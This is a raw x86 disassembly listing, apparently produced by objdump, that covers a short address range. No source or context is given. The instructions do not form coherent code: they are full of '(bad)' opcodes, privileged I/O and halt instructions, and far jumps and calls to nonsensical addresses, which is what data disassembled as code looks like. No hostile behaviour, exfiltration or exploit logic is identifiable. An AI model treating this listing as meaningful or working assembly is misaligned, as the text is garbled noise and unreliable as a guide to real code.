  420c43:	and    DWORD PTR [ebp-0x471cff88],esi
  420c49:	jns    0x420bd5
  420c4b:	jmp    0xadc4289a
  420c50:	lds    ecx,FWORD PTR [eax+edx*2]
  420c53:	popf   
  420c54:	data16 (bad) 
  420c56:	pop    esp
  420c57:	push   ecx
  420c58:	sub    ax,0x3671
  420c5c:	mov    ds:0x7f86e47,eax
  420c61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c62:	test   al,0x35
  420c64:	(bad)  
  420c65:	dec    ebp
  420c66:	dec    esp
  420c67:	adc    dh,BYTE PTR ds:0x36962b3f
  420c6d:	pop    eax
  420c6e:	and    DWORD PTR [esi],0x4d
  420c71:	sub    dl,BYTE PTR [eax+0x29]
  420c74:	fs mov ch,0x87
  420c77:	in     eax,dx
  420c78:	(bad)  
  420c79:	(bad)  
  420c7a:	sub    BYTE PTR [edx],bl
  420c7c:	adc    DWORD PTR [edx+0x6da81702],0x197083fd
  420c86:	jo     0x420c77
  420c88:	repz push esp
  420c8a:	js     0x420c4e
  420c8c:	scas   eax,DWORD PTR es:[edi]
  420c8d:	cwde   
  420c8e:	mov    fs,WORD PTR [edi]
  420c90:	(bad)  
  420c91:	out    dx,al
  420c92:	add    BYTE PTR [ecx],bh
  420c94:	(bad)  
  420c96:	aas    
  420c97:	sub    edi,DWORD PTR [ebx+0xc]
  420c9a:	jp     0x420c3a
  420c9c:	mov    dh,0x3e
  420c9e:	adc    edx,ebp
  420ca0:	enter  0x3277,0x4f
  420ca4:	dec    ebx
  420ca5:	inc    ecx
  420ca6:	(bad)  
  420ca7:	arpl   WORD PTR ds:0x35844,di
  420cad:	sbb    BYTE PTR [ecx],dh
  420caf:	mov    ebx,0x1c0c2213
  420cb4:	mov    edi,0x70b57d3d
  420cb9:	push   0x10
  420cbb:	dec    ecx
  420cbc:	mov    bh,0xf8
  420cbe:	jle    0x420ca7
  420cc0:	jbe    0x420cca
  420cc2:	fidiv  WORD PTR [ebx]
  420cc4:	ficom  DWORD PTR [edx+0x6624ac0]
  420cca:	sbb    al,0xeb
  420ccc:	icebp  
  420ccd:	pop    esi
  420cce:	mov    fs,WORD PTR [eax-0x4]
  420cd1:	jo     0x420d02
  420cd3:	pop    ss
  420cd4:	sar    dl,1
  420cd6:	jb     0x420c6c
  420cd8:	into   
  420cd9:	sub    DWORD PTR [esi-0x4dd3e7ac],esi
  420cdf:	adc    ch,ah
  420ce1:	scas   eax,DWORD PTR es:[edi]
  420ce2:	jo     0x420d43
  420ce4:	pop    eax
  420ce5:	mov    esp,0x20c1d4ca
  420cea:	aad    0xbc
  420cec:	out    dx,eax
  420ced:	jno    0x420d21
  420cef:	push   eax
  420cf0:	in     al,dx
  420cf1:	mov    BYTE PTR [ecx+0x36],ah
  420cf4:	scas   eax,DWORD PTR es:[edi]
  420cf5:	sub    ebp,edi
  420cf7:	and    esp,ebx
  420cf9:	jle    0x420d52
  420cfb:	fst    DWORD PTR [eax]
  420cfd:	fist   DWORD PTR [eax-0x77f1f6f]
  420d03:	outs   dx,BYTE PTR ds:[esi]
  420d04:	test   dl,ch
  420d06:	adc    DWORD PTR [eax+0x20],edi
  420d09:	and    BYTE PTR [edx],ch
  420d0b:	punpckhdq mm0,QWORD PTR [edx-0x3b5f8d3e]
  420d12:	test   BYTE PTR [esp+edi*2],0x2a
  420d16:	xchg   esp,eax
  420d17:	popf   
  420d18:	xor    al,0xbc
  420d1a:	jmp    0x420d2b
  420d1c:	sti    
  420d1d:	sub    eax,0xc3e84a9b
  420d22:	in     al,0x62
  420d24:	jb     0x420d0e
  420d26:	sbb    DWORD PTR [esi-0x1b],eax
  420d29:	mov    bh,BYTE PTR [ecx+0x4a0ca27b]
  420d2f:	dec    edi
  420d30:	mov    ch,BYTE PTR [bx+si+0x2]
  420d34:	push   es
  420d35:	arpl   WORD PTR gs:[ebp+0x15],di
  420d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d3a:	retf   
  420d3b:	mov    ecx,0xfc682e3f
  420d40:	test   BYTE PTR [esi],dh
  420d42:	or     eax,0xe3db940
  420d47:	xlat   BYTE PTR ds:[ebx]
  420d48:	pop    ss
  420d49:	(bad)  
  420d4a:	fdivr  st(1),st
  420d4c:	lods   al,BYTE PTR ds:[esi]
  420d4d:	mov    ebp,0x4bd453de
  420d52:	mov    edi,esp
  420d54:	nop
  420d55:	cdq    
  420d56:	lds    ebp,FWORD PTR [edi]
  420d58:	adc    eax,0xecbac130
  420d5d:	icebp  
  420d5e:	icebp  
  420d5f:	mov    esp,0xf12ce465
  420d64:	sbb    al,0x96
  420d66:	push   eax
  420d67:	arpl   WORD PTR [ebp-0x5625d3b2],ax
  420d6d:	jae    0x420d23
  420d6f:	cmp    edx,DWORD PTR [esi]
  420d71:	popa   
  420d72:	popa   
  420d73:	dec    ebx
  420d74:	add    BYTE PTR [ecx+eiz*2-0x2d],bh
  420d78:	(bad)  
  420d79:	bound  ecx,QWORD PTR [esi+0x35]
  420d7c:	ror    DWORD PTR [eax],1
  420d7e:	xchg   ebp,eax
  420d7f:	(bad)  
  420d80:	loopne 0x420dc5
  420d82:	and    DWORD PTR [ecx-0x7fba050c],ebp
  420d88:	aas    
  420d89:	dec    esi
  420d8a:	inc    edx
  420d8b:	dec    esi
  420d8c:	cmp    dl,dh
  420d8e:	out    dx,al
  420d8f:	inc    ecx
  420d90:	in     eax,0xf1
  420d92:	pop    edx
  420d93:	push   cs
  420d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d95:	push   0x587b49f7
  420d9a:	hlt    
  420d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d9c:	popa   
  420d9d:	ins    DWORD PTR es:[edi],dx
  420d9e:	dec    esi
  420d9f:	leave  
  420da0:	mov    eax,ds:0x97d7260d
  420da5:	mov    esp,0xd2bf4490
  420daa:	inc    esp
  420dab:	ins    DWORD PTR es:[edi],dx
  420dac:	mov    ds:0x683aec72,al
  420db1:	mov    cl,0xd0
  420db3:	mov    ecx,DWORD PTR [ebx+0x71381dcf]
  420db9:	call   0xda2d:0x360e5b24
  420dc0:	xchg   edx,eax
  420dc1:	inc    esi
  420dc2:	cld    
  420dc3:	bound  edi,QWORD PTR [eax-0x4c]
  420dc6:	dec    esi
  420dc7:	add    eax,DWORD PTR [ecx]
  420dc9:	pop    ss
  420dca:	jle    0x420e1a
  420dcc:	or     BYTE PTR [edi+0xf],0x62
  420dd0:	out    dx,eax
  420dd1:	aas    
  420dd2:	or     dh,BYTE PTR [edi+ecx*1+0x64]
  420dd6:	xchg   edx,eax
  420dd7:	lods   eax,DWORD PTR ds:[esi]
  420dd8:	push   es
  420dd9:	add    ebp,ebx
  420ddb:	jg     0x420e1c
  420ddd:	adc    al,bh
  420ddf:	mov    dl,BYTE PTR [ebx+0x507321f2]
  420de5:	call   0x2aa6:0xa9847027
  420dec:	pusha  
  420ded:	add    ah,BYTE PTR [esi-0x5c76672b]
  420df3:	pop    ebp
  420df4:	frstor [edx]
  420df6:	add    DWORD PTR [edx],ebp
  420df8:	mov    edx,DWORD PTR [esi+0x7e]
  420dfb:	inc    eax
  420dfc:	and    BYTE PTR [ecx],dh
  420dfe:	mov    edx,0x6d87a515
  420e03:	xchg   ecx,eax
  420e04:	lea    ecx,[edx+0x5c]
  420e07:	inc    eax
  420e08:	inc    edx
  420e09:	inc    esp
  420e0a:	jg     0x420dcd
  420e0c:	dec    bp
  420e0e:	mov    al,0x28
  420e10:	test   DWORD PTR [esi-0x7a],esi
  420e13:	dec    eax
  420e14:	or     eax,0x3da98fb5
  420e19:	jmp    0x8793702e
  420e1e:	lods   al,BYTE PTR ds:[esi]
  420e1f:	push   cs
  420e20:	inc    ecx
  420e21:	mov    edx,0xb3d6fa2f
  420e26:	push   cs
  420e27:	imul   ebx,esi,0x39e2ea5f
  420e2d:	adc    al,0xcc
  420e2f:	cmp    DWORD PTR [ecx+0x52],0x69798d36
  420e36:	mov    bl,0xca
  420e38:	call   0xae33:0x5837fd04
  420e3f:	lods   eax,DWORD PTR ds:[esi]
  420e40:	ficomp WORD PTR [edx-0x52134c76]
  420e46:	in     eax,0x2c
  420e48:	dec    ebx
  420e49:	inc    esi
  420e4a:	ja     0x420dda
  420e4c:	jo     0x420e50
  420e4e:	jns    0x420eca
  420e50:	outs   dx,DWORD PTR ds:[esi]
  420e51:	fidivr WORD PTR gs:[ecx-0x5c]
  420e55:	js     0x420e96
  420e57:	mov    bh,0x88
  420e59:	ins    DWORD PTR es:[edi],dx
  420e5a:	push   esi
  420e5b:	mov    eax,0xf0aa6aaa
  420e60:	cmc    
  420e61:	arpl   WORD PTR [ebp-0x5c0b6702],dx
  420e67:	js     0x420e08
  420e69:	fild   QWORD PTR [eax+0x37a7c18]
  420e6f:	mov    bl,0x14
  420e71:	xchg   esi,eax
  420e72:	mov    ecx,0xaf8bfc81
  420e77:	sti    
  420e78:	adc    bh,BYTE PTR [eax-0x3a]
  420e7b:	adc    dl,BYTE PTR [edx-0x7623a7af]
  420e81:	sbb    BYTE PTR [edi+eiz*4+0x7e],ah
  420e85:	iret   
  420e86:	xor    eax,0x647bd6be
  420e8b:	sbb    al,BYTE PTR ds:0xfb24a442
  420e91:	std    
  420e92:	ficomp WORD PTR [edi+edx*8-0x44]
  420e96:	sub    eax,0x56a8e3f9
  420e9b:	sbb    BYTE PTR [ecx+0xc85b4e8],0xae
  420ea2:	inc    esi
  420ea3:	pushf  
  420ea4:	jmp    0xde2578ef
  420ea9:	xchg   ebp,eax
  420eaa:	push   cs
  420eab:	imul   eax,DWORD PTR [edi+0x111e5922],0xfffffff6
  420eb2:	push   0xb7f970be
  420eb7:	mov    al,ds:0x4728d8e1
  420ebc:	mov    edx,0x67d410b
  420ec1:	jne    0x420e76
  420ec3:	das    
  420ec4:	pop    ecx
  420ec5:	lahf   
  420ec6:	jo     0x420f3f
  420ec8:	push   ecx
  420ec9:	loopne 0x420ea1
  420ecb:	jo     0x420ea2
  420ecd:	fdivp  st(4),st
  420ecf:	sbb    cl,BYTE PTR [ecx+eiz*4]
  420ed2:	pop    ds
  420ed3:	aam    0xc9
  420ed5:	and    DWORD PTR [eax],0xffffffad
  420ed8:	fs not esp
  420edb:	or     bl,BYTE PTR [ebx+eax*8+0x6f]
  420edf:	adc    edi,esp
  420ee1:	jo     0x420e79
  420ee3:	xor    ebx,ebp
  420ee5:	retf   0x90b2
  420ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee9:	xchg   esp,eax
  420eea:	je     0x420e8d
  420eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eed:	hlt    
  420eee:	in     eax,dx
  420eef:	stos   DWORD PTR es:[di],eax
  420ef1:	cmp    ch,ah
  420ef3:	inc    ebx
  420ef4:	inc    esp
  420ef5:	shr    BYTE PTR [ecx+0x3adbae1],1
  420efb:	ins    BYTE PTR es:[edi],dx
  420efc:	inc    eax
  420efd:	fadd   DWORD PTR [ebx+0x13]
  420f00:	test   DWORD PTR [ecx+0x2ec701ea],ebx
  420f06:	ins    DWORD PTR es:[edi],dx
  420f07:	jmp    0x5db3d3ea
  420f0c:	cmp    eax,ebp
  420f0e:	into   
  420f0f:	hlt    
  420f10:	enter  0xc662,0xa1
  420f14:	add    al,cl
  420f16:	jns    0x420eae
  420f18:	dec    esi
  420f19:	adc    eax,0x29adc27b
  420f1e:	xor    al,0x10
  420f20:	inc    edi
  420f21:	(bad)  
  420f22:	dec    ebx
  420f23:	and    al,0x76
  420f25:	and    ebx,DWORD PTR [ebx+0x73]
  420f28:	jb     0x420ed9
  420f2a:	and    bl,0x38
  420f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f2e:	(bad)  
  420f2f:	cmp    al,0x9d
  420f31:	imul   esi,DWORD PTR cs:[esi-0x18aacea4],0x3d
  420f39:	pop    ebp
  420f3a:	dec    esi
  420f3b:	out    dx,al
  420f3c:	test   DWORD PTR [ecx-0x1de398f6],0x4b73650
  420f46:	outs   dx,DWORD PTR ds:[esi]
  420f47:	lods   eax,DWORD PTR ds:[esi]
  420f48:	and    ch,cl
  420f4a:	adc    al,0x96
  420f4c:	xchg   esp,eax
  420f4d:	jo     0x420fa0
  420f4f:	test   BYTE PTR [ebx],ah
  420f51:	fldlg2 
  420f53:	push   ebx
  420f54:	repz push esi
  420f56:	xchg   esi,eax
  420f57:	loopne 0x420efc
  420f59:	pop    ebp
  420f5a:	cwde   
  420f5b:	xor    eax,0xf3c6e9f5
  420f60:	inc    ebp
  420f61:	jbe    0x420f82
  420f63:	push   ss
  420f64:	adc    al,0x48
  420f66:	pop    ebp
  420f67:	sahf   
  420f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f69:	sahf   
  420f6a:	dec    ebp
  420f6b:	mov    esi,0x27c31a98
  420f70:	xor    DWORD PTR ds:0x38f20739,eax
  420f76:	push   edi
  420f77:	mov    bh,0x3f
  420f79:	inc    ecx
  420f7a:	fst    QWORD PTR [ebx]
  420f7c:	stc    
  420f7d:	mov    bh,0x82
  420f7f:	inc    edi
  420f80:	popf   
  420f81:	mov    ecx,DWORD PTR [ebp-0xcb0322e]
  420f87:	stc    
  420f88:	retf   
  420f89:	jbe    0x420f22
  420f8b:	add    DWORD PTR [eax],esi
  420f8d:	das    
  420f8e:	imul   edi,DWORD PTR [eax+0x1],0xffffffd9
  420f92:	imul   eax,esp,0x5a5f548b
  420f98:	inc    esi
  420f99:	dec    ebx
  420f9a:	jge    0x420fd4
  420f9c:	lahf   
  420f9d:	das    
  420f9e:	jmp    FWORD PTR ds:0x4c5c054f
  420fa4:	xor    cl,dl
  420fa6:	mov    esi,0xff279569
  420fab:	dec    ebx
  420fac:	imul   edx,DWORD PTR [eax+eax*8],0x112146d2
  420fb3:	out    0xc4,al
  420fb5:	push   edi
  420fb6:	cmc    
  420fb7:	xchg   ebp,eax
  420fb8:	hlt    
  420fb9:	and    eax,DWORD PTR [esi+0x9d33dee]
  420fbf:	es ret 0xd794
  420fc3:	js     0x420f85
  420fc5:	jae    0x420f76
  420fc7:	leave  
  420fc8:	scas   eax,DWORD PTR es:[edi]
  420fc9:	mov    dl,0x57
  420fcb:	jl     0x420f99
  420fcd:	jl     0x420fcb
  420fcf:	jl     0x421031
  420fd1:	fisttp DWORD PTR [ebx+0x23]
  420fd4:	test   eax,0xc76b138d
  420fd9:	push   ds
  420fda:	jge    0x421025
  420fdc:	dec    ebp
  420fdd:	push   esi
  420fde:	mov    ah,BYTE PTR [ecx-0x683f471b]
  420fe4:	scas   eax,DWORD PTR es:[edi]
  420fe5:	xchg   BYTE PTR [ebx],ch
  420fe7:	xor    DWORD PTR [edx-0x11a13f68],ebx
  420fed:	xor    ah,bh
  420fef:	pusha  
  420ff0:	gs push 0xb
  420ff3:	add    esp,DWORD PTR [ebx+0x1057f889]
  420ff9:	dec    edx
  420ffa:	jne    0x421016
  420ffc:	cld    
  420ffd:	test   edx,edi
  420fff:	dec    eax
  421000:	xchg   ecx,eax
  421001:	mov    bh,0x7e
  421003:	out    0x83,eax
  421005:	neg    esi
  421007:	mov    ds:0x3f222d15,eax
  42100c:	inc    edx
  42100d:	test   BYTE PTR [eax],ah
  42100f:	mov    dl,0xfc
  421011:	mov    bh,0x60
  421013:	jnp    0x421013
  421015:	push   ds
  421016:	mov    dl,0x9a
  421018:	stos   BYTE PTR es:[edi],al
  421019:	in     eax,dx
  42101a:	arpl   dx,si
  42101c:	ret    
  42101d:	or     al,0x9e
  42101f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421020:	call   0x2c15:0xbaff0c81
  421027:	cmc    
  421028:	dec    ebp
  421029:	dec    edx
  42102a:	jle    0x420fc7
  42102c:	xor    BYTE PTR [eax],cl
  42102e:	dec    eax
  42102f:	fistp  WORD PTR [eax+ecx*1+0x62]
  421033:	outs   dx,BYTE PTR ds:[esi]
  421034:	cmp    dh,BYTE PTR [ebp+0x1e]
  421037:	imul   esp,eax,0xa3c9f2de
  42103d:	pop    ds
  42103e:	pop    ecx
  42103f:	jbe    0x420ff5
  421041:	das    
  421042:	push   ecx
  421043:	inc    eax
  421044:	mov    ebp,0x57b690eb
  421049:	push   ss
  42104a:	lds    ebp,FWORD PTR [ebp+0x4d]
  42104d:	jp     0x420fda
  42104f:	mov    edx,0xf6a233e0
  421054:	sahf   
  421055:	inc    ebx
  421056:	data16 lahf 
  421058:	shr    DWORD PTR [edi+0x46],cl
  42105b:	stos   BYTE PTR es:[edi],al
  42105c:	jmp    0x421031
  42105e:	mov    bl,0xca
  421060:	inc    edi
  421061:	mov    cl,0x15
  421063:	add    al,0x6b
  421065:	sub    eax,0xf589a6db
  42106a:	mov    BYTE PTR [eax],bl
  42106c:	fcom   st(0)
  42106e:	dec    esi
  42106f:	mov    WORD PTR [ebx],?
  421071:	push   eax
  421072:	mov    dl,0xd3
  421074:	arpl   WORD PTR [ebp-0x7e],cx
  421077:	std    
  421078:	xor    BYTE PTR [ebx+0x38523008],0x42
  42107f:	(bad)  
  421080:	out    0xbe,eax
  421082:	pop    ecx
  421083:	cld    
  421084:	xlat   BYTE PTR ds:[ebx]
  421085:	xor    DWORD PTR [edi+0x4ab46d5d],ebp
  42108b:	push   es
  42108c:	jnp    0x421027
  42108e:	stos   DWORD PTR es:[edi],eax
  42108f:	mov    al,0x18
  421091:	dec    BYTE PTR [eax+eax*8-0x6a4478d7]
  421098:	popa   
  421099:	jb     0x421069
  42109b:	mov    ch,0x7b
  42109d:	aas    
  42109e:	ret    
  42109f:	sub    BYTE PTR [edx*2-0x5f6156ee],bl
  4210a6:	test   al,0xd0
  4210a8:	iret   
  4210a9:	sbb    eax,0x69c1dded
  4210ae:	out    0x77,al
  4210b0:	lods   eax,DWORD PTR ds:[esi]
  4210b1:	ret    0xb6c9
  4210b4:	adc    al,0x71
  4210b6:	adc    DWORD PTR [ebp-0x168e0a39],0xffffffc3
  4210bd:	fs stc 
  4210bf:	cmp    dl,BYTE PTR [esi+0x78c795d3]
  4210c5:	sbb    DWORD PTR [edi],edi
  4210c7:	in     eax,0xde
  4210c9:	push   ecx
  4210ca:	data16 lods al,BYTE PTR ds:[esi]
  4210cc:	push   edx
  4210cd:	stos   DWORD PTR es:[edi],eax
  4210ce:	sub    eax,0xe4355a6a
  4210d3:	sbb    DWORD PTR [eax-0x35],eax
  4210d6:	je     0x4210e5
  4210d8:	mov    bl,0x63
  4210da:	push   0xffffffb9
  4210dc:	sub    BYTE PTR [edx+0x56],bl
  4210df:	add    edi,DWORD PTR [eax+0x5d2a0054]
  4210e5:	sbb    DWORD PTR [esi+0x1273a1a0],esi
  4210eb:	push   ebx
  4210ec:	ficom  DWORD PTR [esi-0x46]
  4210ef:	retf   0x2b90
  4210f2:	add    eax,0x179d9429
  4210f7:	inc    esi
  4210f8:	loope  0x421092
  4210fa:	jae    0x421126
  4210fc:	in     al,0xdb
  4210fe:	test   edi,eax
  421100:	xchg   ebx,eax
  421101:	jo     0x4210d8
  421103:	push   esi
  421104:	mov    ss,WORD PTR [ebx+ebp*8-0x2b]
  421108:	out    0xd7,al
  42110a:	xchg   ebx,eax
  42110b:	xor    BYTE PTR [ecx+eiz*8+0x12],dl
  42110f:	fild   QWORD PTR [eax]
  421111:	xchg   ecx,eax
  421112:	sbb    al,0x73
  421114:	shl    dh,0x20
  421117:	ret    
  421118:	jns    0x4210de
  42111a:	ds icebp 
  42111c:	bound  edx,QWORD PTR [ecx]
  42111e:	out    0x79,eax
  421120:	dec    ebp
  421121:	shr    esi,cl
  421123:	mov    eax,ds:0x7bc5f4d7
  421128:	fcom   DWORD PTR [ebx-0x233a1837]
  42112e:	mov    ecx,0xcda0fda4
  421133:	xor    bh,0x9b
  421136:	xchg   edx,eax
  421137:	adc    eax,0x75810f90
  42113c:	popf   
  42113d:	ds xchg ecx,eax
  42113f:	sar    cl,cl
  421141:	test   eax,0xb25f541
  421146:	imul   edi,DWORD PTR [ecx+0x691b7e80],0xffffffa7
  42114d:	adc    eax,0x688de909
  421152:	mov    dl,0xed
  421154:	jnp    0x421178
  421156:	xor    ebp,ebp
  421158:	test   eax,0x9e01c3f1
  42115d:	(bad)  
  42115e:	and    eax,0xbc1a71e
  421163:	pop    ds
  421164:	dec    esp
  421165:	mov    al,0xd9
  421167:	pop    ss
  421168:	hlt    
  421169:	adc    DWORD PTR gs:[edx+0x662b8a73],ecx
  421170:	sub    al,0x61
  421172:	ficom  WORD PTR [eax]
  421174:	leave  
  421175:	push   ecx
  421176:	cmp    al,0xda
  421178:	fcom   QWORD PTR [eax-0x41e974dc]
  42117e:	xchg   ecx,eax
  42117f:	xchg   BYTE PTR [ecx-0x40],bl
  421182:	mov    dh,0x15
  421184:	call   0x9a51:0xcb75d62b
  42118b:	imul   ecx,DWORD PTR [edx-0xc],0x966f03b0
  421192:	test   DWORD PTR [edx+0x147dff14],ebx
  421198:	xor    DWORD PTR ds:0xafc639a,ebx
  42119e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42119f:	push   0x2d4a6eb1
  4211a4:	scas   al,BYTE PTR es:[edi]
  4211a5:	push   ebx
  4211a6:	cli    
  4211a7:	push   cs
  4211a8:	scas   eax,DWORD PTR es:[edi]
  4211a9:	jg     0x421214
  4211ab:	xchg   ebx,eax
  4211ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211ad:	fst    DWORD PTR [edi+0x13]
  4211b0:	ss dec sp
  4211b3:	fdivr  st(4),st
  4211b5:	(bad)
  4211ba:	mov    dh,0x79
  4211bc:	mov    edx,DWORD PTR [ecx]
  4211be:	or     eax,0x7b899840
  4211c3:	lea    edi,[ebp-0x23c78874]
  4211c9:	and    cl,BYTE PTR ds:0x3ee18991
  4211cf:	std    
  4211d0:	out    0xad,al
  4211d2:	pop    es
  4211d3:	jg     0x421212
  4211d5:	and    esi,DWORD PTR [esi-0x1c9fa5ed]
  4211db:	and    DWORD PTR [eax-0x7e],esi
  4211de:	retf   
  4211df:	popf   
  4211e0:	jl     0x4211aa
  4211e2:	sbb    edx,DWORD PTR [edi]
  4211e4:	mov    dh,0x89
  4211e6:	test   al,0x75
  4211e8:	stos   DWORD PTR es:[edi],eax
  4211e9:	or     eax,0x9e9a5bdd
  4211ee:	push   es
  4211ef:	imul   edx,edx,0x8264011
  4211f5:	sub    al,0x63
  4211f7:	fadd   DWORD PTR [eax+0x62]
  4211fa:	mov    ch,0xcd
  4211fc:	and    bl,BYTE PTR [edi+0x3f884177]
  421202:	xlat   BYTE PTR ds:[ebx]
  421203:	add    DWORD PTR [edi],0xffffff82
  421206:	test   eax,0xa8598294
  42120b:	fs jmp 0x6e7d:0x36b015b2
  421213:	inc    eax
  421214:	mov    esi,0xfd5df9ea
  421219:	or     dh,BYTE PTR [ebx+0x1a]
  42121c:	ds jnp 0x42124b
  42121f:	cmc    
  421220:	(bad)  
  421221:	int    0x1e
  421223:	push   ebp
  421224:	adc    eax,0xc23d8a54
  421229:	ror    BYTE PTR [esi-0x51],cl
  42122c:	xor    DWORD PTR [ebx+eax*8-0x32],esp
  421230:	nop
  421231:	add    esp,DWORD PTR [edx+0xe78c4d3]
  421237:	jle    0x42128a
  421239:	in     al,0xc8
  42123b:	lahf   
  42123c:	repz or al,0x73
  42123f:	xchg   edx,eax
  421240:	aad    0x70
  421242:	cmp    ch,0x6d
  421245:	and    ecx,ecx
  421247:	ret    0x2871
  42124a:	mov    eax,0x357b4787
  42124f:	mul    DWORD PTR ss:[eax+0x67]
  421253:	push   0x5f
  421255:	xlat   BYTE PTR ds:[ebx]
  421256:	outs   dx,DWORD PTR ds:[esi]
  421257:	pushf  
  421258:	adc    DWORD PTR [eax+0x2f458c6f],0xb8c3eb97
  421262:	(bad)  
  421264:	jae    0x4212bb
  421266:	cmp    eax,0xb2c2c1cb
  42126b:	outs   dx,BYTE PTR ds:[esi]
  42126c:	(bad)  
  42126d:	sar    BYTE PTR [esi],cl
  42126f:	aas    
  421270:	dec    ebx
  421271:	ficom  DWORD PTR [esi]
  421273:	int    0x5b
  421275:	cwde   
  421276:	sbb    al,0x83
  421278:	nop
  421279:	mov    ds:0x931c87d3,eax
  42127e:	xchg   ebx,eax
  42127f:	add    BYTE PTR ds:0x86bb0978,0xe9
  421286:	(bad)  
  421287:	into   
  421288:	inc    esi
  421289:	push   0x88f78aec
  42128e:	pop    es
  42128f:	out    dx,eax
  421290:	out    dx,eax
  421291:	fdivr  QWORD PTR [edx-0x6b4c7ff5]
  421297:	fnstcw WORD PTR [ebp-0x4833e726]
  42129d:	xchg   esp,eax
  42129e:	adc    DWORD PTR [ecx+0x30],esp
  4212a1:	cmp    al,0xb4
  4212a3:	sub    esi,DWORD PTR [edx-0x336d526]
  4212a9:	pop    eax
  4212aa:	imul   ecx,DWORD PTR [ebp-0x439af3cd],0x1b
  4212b1:	hlt    
  4212b2:	pop    ebx
  4212b3:	aas    
  4212b4:	mov    bh,0x94
  4212b6:	sub    DWORD PTR ss:[eax+ebx*2],ebx
  4212ba:	sar    BYTE PTR [ecx+eax*8],cl
  4212bd:	stos   DWORD PTR es:[edi],eax
  4212be:	push   es
  4212bf:	push   cs
  4212c0:	dec    esi
  4212c1:	xchg   edi,eax
  4212c2:	nop
  4212c3:	iret   
  4212c4:	pop    ds
  4212c5:	cmp    DWORD PTR [ebp-0x15],eax
  4212c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212c9:	shl    BYTE PTR [eax],0x2c
  4212cc:	xchg   edi,eax
  4212cd:	int3   
  4212ce:	add    ebx,DWORD PTR ds:0x83906011
  4212d4:	mov    edi,0x6c39d1e5
  4212d9:	(bad)  
  4212db:	cli    
  4212dc:	sub    ebx,DWORD PTR [ebx-0x75]
  4212df:	inc    esp
  4212e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212e1:	xor    ebp,ebp
  4212e3:	fs push ss
  4212e5:	out    0xb8,al
  4212e7:	adc    DWORD PTR [ebx+0x2f],0xffffffb0
  4212eb:	dec    edx
  4212ec:	test   al,0x49
  4212ee:	jecxz  0x42134a
  4212f0:	shl    BYTE PTR [edx+0x6f],0x71
  4212f4:	cmp    esp,esp
  4212f6:	xchg   esi,ebp
  4212f8:	cmp    DWORD PTR [ecx-0x36],ecx
  4212fb:	add    eax,0x3bc5f1ee
  421300:	daa    
  421301:	jmp    0x8770:0xd30c3326
  421308:	aas    
  421309:	loopne 0x42134a
  42130b:	clc    
  42130c:	fwait
  42130d:	xchg   edi,eax
  42130e:	or     dh,BYTE PTR [eax+0x24]
  421311:	jg     0x421371
  421313:	cwde   
  421314:	(bad)  [edi-0x34]
  421317:	mov    al,0x5
  421319:	popa   
  42131a:	loopne 0x421333
  42131c:	fidivr WORD PTR [ecx]
  42131e:	push   ecx
  42131f:	pop    edi
  421320:	xchg   ecx,eax
  421321:	ja     0x42137f
  421323:	in     al,0x31
  421325:	mov    ah,0xf
  421327:	aad    0xef
  421329:	pop    edi
  42132a:	add    eax,0x80d35232
  42132f:	retf   0xa7f1
  421332:	add    dl,BYTE PTR [ebx+0x2b]
  421335:	cmp    DWORD PTR [eax-0x69],0xffffffa7
  421339:	sbb    BYTE PTR [ecx],cl
  42133b:	mov    dh,0x9a
  42133d:	sub    eax,0xc64b4162
  421342:	and    DWORD PTR [eax+0x57a3a0ba],0xffffff97
  421349:	cmp    DWORD PTR [edx-0x32],esi
  42134c:	dec    esi
  42134d:	arpl   bp,cx
  42134f:	adc    BYTE PTR [ebx+0x18e3c768],ah
  421355:	fbstp  TBYTE PTR [edx+0x4]
  421358:	popa   
  421359:	(bad)  
  42135a:	mov    edi,eax
  42135c:	fcomp  DWORD PTR [ecx-0x49a5046a]
  421362:	std    
  421363:	add    bl,cl
  421365:	sbb    bh,ch
  421367:	jb     0x421361
  421369:	mov    DWORD PTR [eax-0x68],ecx
  42136c:	cld    
  42136d:	xor    BYTE PTR [esi-0x59724ab2],ch
  421373:	and    edx,DWORD PTR [esi]
  421375:	js     0x42138c
  421377:	sub    eax,0xe9d74e18
  42137c:	pop    esp
  42137d:	and    edx,eax
  42137f:	cmc    
  421380:	fiadd  DWORD PTR [eax-0x79]
  421383:	push   cs
  421384:	aam    0x75
  421386:	adc    al,0x97
  421388:	out    0xfa,eax
  42138a:	jmp    0xc108:0xa6bfc939
  421391:	pop    edx
  421392:	lods   eax,DWORD PTR ds:[esi]
  421393:	ss loope 0x421394
  421396:	cld    
  421397:	sar    ch,1
  421399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42139a:	xor    cl,BYTE PTR [ebx+0x3f]
  42139d:	adc    DWORD PTR [edi+eiz*1+0x11],eax
  4213a1:	cdq    
  4213a2:	ins    DWORD PTR es:[edi],dx
  4213a3:	mov    esi,0xaefc6afe
  4213a8:	aaa    
  4213a9:	mov    edi,0x904f13b
  4213ae:	sbb    eax,0xaf47c17f
  4213b3:	jle    0x421426
  4213b5:	fst    DWORD PTR [ebx]
  4213b7:	(bad)  
  4213b8:	push   ds
  4213b9:	jle    0x4213d6
  4213bb:	xchg   esp,eax
  4213bc:	les    eax,FWORD PTR [ebx-0x77135a27]
  4213c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213c3:	mov    ?,WORD PTR [ecx+0x2e]
  4213c6:	outs   dx,BYTE PTR ds:[esi]
  4213c7:	retf   
  4213c8:	inc    ecx
  4213c9:	cmp    bh,BYTE PTR [ecx+0x16]
  4213cc:	mov    ebx,DWORD PTR [edx+0x56b93e5b]
  4213d2:	mov    ah,0x31
  4213d4:	fmul   QWORD PTR [ebx+ebp*8-0x75]
  4213d8:	fwait
